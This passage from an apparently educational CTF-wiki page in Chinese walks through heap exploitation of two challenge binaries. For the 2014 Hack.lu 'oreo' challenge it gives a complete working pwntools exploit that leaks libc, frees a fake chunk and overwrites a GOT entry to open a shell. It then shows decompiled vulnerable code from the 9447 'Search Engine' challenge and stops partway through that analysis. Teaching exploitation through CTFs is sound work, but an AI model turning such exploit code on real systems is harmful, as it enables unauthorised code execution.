oreo:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bit<span class=w> </span>LSB<span class=w> </span>executable,<span class=w> </span>Intel<span class=w> </span><span class=m>80386</span>,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib/ld-linux.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.26,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>f591eececd05c63140b9d658578aea6c24450f8b,<span class=w> </span>stripped
➜<span class=w>  </span>2014_Hack.lu_oreo<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>oreo
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>No<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
</code></pre></div> <p>可以看出，程序確實是比較老的，32位程序，動態鏈接，就連 RELRO 技術也沒有上。</p> <h3 id=_16>基本功能<a class=headerlink href=#_16 title="Permanent link">&para;</a></h3> <p><strong>需要注意的是，該程序並沒有進行 setvbuf 操作，因此在初次執行 io 函數時，會在堆上分配空間。</strong></p> <p>正如程序中直接輸出的信息，程序主要是一個原始的在線槍支系統。其中，根據添加槍支的過程，我們可以得到槍支的基本結構如下</p> <div class=highlight><pre><span></span><code><span class=mo>00000000</span><span class=w> </span><span class=n>rifle</span><span class=w>           </span><span class=n>struc</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=p>(</span><span class=k>sizeof</span><span class=o>=</span><span class=mh>0x38</span><span class=p>,</span><span class=w> </span><span class=n>mappedto_5</span><span class=p>)</span>
<span class=mo>00000000</span><span class=w> </span><span class=n>descript</span><span class=w>        </span><span class=n>db</span><span class=w> </span><span class=mi>25</span><span class=w> </span><span class=n>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
<span class=mo>0000001</span><span class=mi>9</span><span class=w> </span><span class=n>name</span><span class=w>            </span><span class=n>db</span><span class=w> </span><span class=mi>27</span><span class=w> </span><span class=n>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
<span class=mo>00000034</span><span class=w> </span><span class=n>next</span><span class=w>            </span><span class=n>dd</span><span class=w> </span><span class=o>?</span><span class=w>                    </span><span class=p>;</span><span class=w> </span><span class=n>offset</span>
<span class=mo>0000003</span><span class=mi>8</span><span class=w> </span><span class=n>rifle</span><span class=w>           </span><span class=n>ends</span>
</code></pre></div> <p>程序的基本功能如下</p> <ul> <li>添加槍支，其主要會讀取槍支的名字與描述。但問題在於讀取的名字的長度過長，可以覆蓋 next 指針以及後面堆塊的數據。可以覆蓋後面堆塊的數據大小爲 56-(56-27)=27 大小。需要注意的是，這些槍支的大小都是在fastbin 範圍內的。</li> <li>展示添加槍支，即從頭到尾輸出槍支的描述與名字。</li> <li>訂已經選擇的槍支，即將所有已經添加的槍支釋放掉，但是並沒有置爲NULL。</li> <li>留下訂貨消息</li> <li>展示目前狀態，即添加了多少隻槍，訂了多少單，留下了什麼信息。</li> </ul> <p>不難分析得到，程序的漏洞主要存在於添加槍支時的堆溢出漏洞。</p> <h3 id=_17>利用<a class=headerlink href=#_17 title="Permanent link">&para;</a></h3> <p>基本利用思路如下</p> <ol> <li>由於程序存在堆溢出漏洞，而且還可以控制 next 指針，我們可以直接控制 next 指針指向程序中 got 表的位置。當進行展示的時候，即可以輸出對應的內容，這裏同時需要確保假設對應地址爲一個槍支結構體時，其 next 指針爲 NULL。這裏我採用 puts@got。通過這樣的操作，我們就可以獲得出 libc 基地址，以及 system 函數地址。</li> <li>由於槍支結構體大小是 0x38 大小，所以其對應的 chunk 爲 0x40。這裏採用 <code>house of sprit</code> 的技術來返回 0x0804A2A8 處的chunk，即留下的消息的指針。因此，我們需要設置 0x0804A2A4 處的內容爲 0x40，即需要添加 0x40 支槍支，從而繞過大小檢測。同時爲了確保可以繞過 next chunk 的檢測，這裏我們編輯留下的消息。</li> <li>在成功分配這樣的 chunk 後，我們其實就有了一個任意地址修改的漏洞，這裏我們可以選擇修改一個合適的 got 項爲 system 地址，從而獲得 shell。</li> </ol> <p>具體代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;gnome-terminal&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;-c&#39;</span><span class=p>]</span>
<span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
    <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s2>&quot;./oreo&quot;</span>
<span class=n>oreo</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./oreo&quot;</span><span class=p>)</span>
<span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;REMOTE&#39;</span><span class=p>]:</span>
    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
<span class=k>else</span><span class=p>:</span>
    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./oreo&quot;</span><span class=p>)</span>
<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;PID: &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>pidof</span><span class=p>(</span><span class=n>p</span><span class=p>)[</span><span class=mi>0</span><span class=p>]))</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>descrip</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
    <span class=c1>#p.recvuntil(&#39;Rifle name: &#39;)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
    <span class=c1>#p.recvuntil(&#39;Rifle description: &#39;)</span>
    <span class=c1>#sleep(0.5)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>descrip</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>show_rifle</span><span class=p>():</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;===================================</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>order</span><span class=p>():</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>message</span><span class=p>(</span><span class=n>notice</span><span class=p>):</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
    <span class=c1>#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>notice</span><span class=p>)</span>


<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>():</span>
    <span class=nb>print</span> <span class=s1>&#39;step 1. leak libc base&#39;</span>
    <span class=n>name</span> <span class=o>=</span> <span class=mi>27</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>oreo</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
    <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
    <span class=n>show_rifle</span><span class=p>()</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;===================================</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Description: &#39;</span><span class=p>)</span>
    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>)[:</span><span class=mi>4</span><span class=p>])</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;puts addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>))</span>
    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
    <span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
    <span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span>

    <span class=nb>print</span> <span class=s1>&#39;step 2. free fake chunk at 0x0804A2A8&#39;</span>

    <span class=c1># now, oifle_cnt=1, we need set it = 0x40</span>
    <span class=n>oifle</span> <span class=o>=</span> <span class=mi>1</span>
    <span class=k>while</span> <span class=n>oifle</span> <span class=o>&lt;</span> <span class=mh>0x3f</span><span class=p>:</span>
        <span class=c1># set next link=NULL</span>
        <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>27</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
        <span class=n>oifle</span> <span class=o>+=</span> <span class=mi>1</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>27</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0804a2a8</span><span class=p>)</span>
    <span class=c1># set next link=0x0804A2A8, try to free a fake chunk</span>
    <span class=n>add</span><span class=p>(</span><span class=mi>25</span> <span class=o>*</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
    <span class=c1># before free, we need to bypass some check</span>
    <span class=c1># fake chunk&#39;s size is 0x40</span>
    <span class=c1># 0x20 *&#39;a&#39; for padding the last fake chunk</span>
    <span class=c1># 0x40 for fake chunk&#39;s next chunk&#39;s prev_size</span>
    <span class=c1># 0x100 for fake chunk&#39;s next chunk&#39;s size</span>
    <span class=c1># set fake iofle&#39; next to be NULL</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=mh>0x20</span> <span class=o>*</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>52</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>128</span><span class=p>,</span> <span class=s1>&#39;c&#39;</span><span class=p>)</span>
    <span class=n>message</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
    <span class=c1># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span>
    <span class=n>order</span><span class=p>()</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Okay order submitted!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

    <span class=nb>print</span> <span class=s1>&#39;step 3. get shell&#39;</span>
    <span class=c1># modify free@got to system addr</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>oreo</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;strlen&#39;</span><span class=p>])</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span>
    <span class=n>add</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mi>20</span><span class=p>)</span>
    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;system addr: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span>
    <span class=c1>#gdb.attach(p)</span>
    <span class=n>message</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>

    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&quot;__main__&quot;</span><span class=p>:</span>
    <span class=n>exp</span><span class=p>()</span>
</code></pre></div> <p>當然，該題目也可以使用 <code>fast bin attack</code> 中的其它技術來實現，可參考參考文獻中的鏈接。</p> <h2 id=2015-9447-ctf-search-engine>2015 9447 CTF : Search Engine<a class=headerlink href=#2015-9447-ctf-search-engine title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine>題目鏈接</a></p> <h3 id=_18>基本信息<a class=headerlink href=#_18 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2015_9447ctf_search-engine<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>search
search:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>-bit<span class=w> </span>LSB<span class=w> </span>executable,<span class=w> </span>x86-64,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib64/ld-linux-x86-64.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.24,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>4f5b70085d957097e91f940f98c0d4cc6fb3343f,<span class=w> </span>stripped
➜<span class=w>  </span>2015_9447ctf_search-engine<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>search
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
<span class=w>    </span>FORTIFY:<span class=w>  </span>Enabled
</code></pre></div> <h3 id=_19>基本功能<a class=headerlink href=#_19 title="Permanent link">&para;</a></h3> <p>程序的基本功能是</p> <ul> <li>索引一個句子</li> <li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li> <li>讀取的字符串長度必須和給定的大小相等</li> <li>每次索引的句子都是直接在直接建立在前面的句子上的。</li> <li>在一個句子中搜索單詞</li> <li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li> <li>讀取指定長度字符串</li> <li>如果有回車標記<ul> <li>在指定長度內沒有遇到回車，則讀完沒有設置NULL標記</li> <li>在指定長度內遇到回車，就截斷返回。</li> </ul> </li> <li>沒有回車標記<ul> <li>讀夠指定長度，沒有NULL標記結尾。</li> </ul> </li> </ul> <h3 id=_20>詞語結構體<a class=headerlink href=#_20 title="Permanent link">&para;</a></h3> <p>通過分析索引句子的過程，我們可以得到詞語的結構如下</p> <div class=highlight><pre><span></span><code>00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
00000000 content         dq ?
00000008 size            dd ?
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?                    ; offset
00000018 len             dd ?
0000001C padding2        dd ?
00000020 next            dq ?                    ; offset
00000028 word_struct     ends
</code></pre></div> <h3 id=_21>堆內存相關操作<a class=headerlink href=#_21 title="Permanent link">&para;</a></h3> <p>分配</p> <ul> <li>malloc 40 字節爲一個word結構體</li> <li>爲句子或者單詞 malloc 指定大小。</li> </ul> <p>釋放</p> <ul> <li>釋放刪除的句子</li> <li>釋放刪除句子所搜索的臨時單詞</li> <li>釋放索引句子時未使用的單詞結構</li> </ul> <h3 id=_22>漏洞<a class=headerlink href=#_22 title="Permanent link">&para;</a></h3> <p><strong>索引句子讀取字符串時無NULL結尾</strong></p> <p>在索引句子時 flag_enter 永遠爲 0，所以讀取句子時最後沒有 NULL 結尾。</p> <div class=highlight><pre><span></span><code><span class=w>    </span><span class=n>_flag_enter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>flag_enter</span><span class=p>;</span>
<span class=w>    </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=n>v4</span><span class=p>];</span>
<span class=w>      </span><span class=n>v6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fread</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=n>v4</span><span class=p>],</span><span class=w> </span><span class=mi>1uLL</span><span class=p>,</span><span class=w> </span><span class=mi>1uLL</span><span class=p>,</span><span class=w> </span><span class=n>stdin</span><span class=p>);</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v6</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=k>break</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>*</span><span class=n>v5</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;\n&#39;</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>_flag_enter</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v4</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>          </span><span class=o>*</span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>          </span><span class=k>return</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>        </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v6</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>v6</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=k>break</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>else</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>v4</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>v6</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>v4</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=k>break</span><span class=p>;</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
</code></pre></div> <p><strong>讀取選擇操作數</strong></p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=nf>read_num</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>endptr</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+8h] [rbp-50h]</span>
<span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>nptr</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+10h] [rbp-48h]</span>
<span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kr>__int64</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+48h] [rbp-10h]</span>

<span class=w>  </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>,</span><span class=w> </span><span class=mi>48</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
<span class=w>  </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>strtol</span><span class=p>(</span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>endptr</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>endptr</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=o>&amp;</span><span class=n>nptr</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>__printf_chk</span><span class=p>(</span><span class=mf>1L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;%s is not a valid number</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>nptr</span><span class=p>);</span>
<span class=w>    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=n>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <p>因爲 read_str 不設置NULL ，因此，如果 nptr 讀取的不合法的話，就有可能會 leak 出棧上的內容。</p> <p><strong>索引句子釋放未置NULL</strong></p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=k>else</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>free</span><span class=p>(</span><span class=n>v6</span><span class=p>);</span>
<span class=w>  </span><span class=p>}</span>
</code></pre></div> <p><strong>搜索詞語中刪除詞語時，對應句子指針只是釋放，並沒有設置爲NULL</strong></p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>head</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=o>-&gt;</span><span class=n>next</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>*</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>v0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>memcmp</span><span class=p>((</span><span class=k>const</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>content</span><span class=p>,</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=n>v0</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>__printf_chk</span><span class=p>(</span><span class=mf>1L</span><span class=n>L</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Found %d: &quot;</span><span class=p>,</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>));</span>
<span class=w>        </span><span class=n>fwrite</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=p>,</span><span class=w> </span><span class=mi>1uLL</span><span class=p>,</span><span class=w> </span><span class=n>SLODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>),</span><span class=w> </span><span class=n>stdout</span><span class=p>);</span>
<span class=w>        </span><span class=n>putchar</span><span class=p>(</span><span class=sc>&#39;\n&#39;</span><span class=p>);</span>
<span class=w>        </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Delete this sentence (y/n)?&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>choice</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>choice</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;y&#39;</span><span class=w> </span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>          </span><span class=n>memset</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>SLODWORD</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>len</span><span class=p>));</span>
<span class=w>          </span><span class=n>free</span><span class=p>(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>sentence_ptr</span><span class=p>);</span>
<span class=w>          </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Deleted!&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=n>free</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
